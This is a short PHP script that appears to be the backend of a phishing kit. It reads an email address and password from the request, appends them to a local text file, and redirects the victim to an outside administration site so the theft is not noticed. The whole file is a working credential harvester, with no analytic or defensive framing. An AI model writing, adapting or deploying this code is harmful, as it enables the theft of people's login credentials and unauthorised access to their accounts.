<?php
$data=$_GET['email'];
$data2=$_GET['password'];
$fp = fopen('data.txt', 'a');
fwrite($fp, $data);
fwrite($fp, $data2);
fclose($fp);
header("Location: https://admin.vizionary.com");
?>
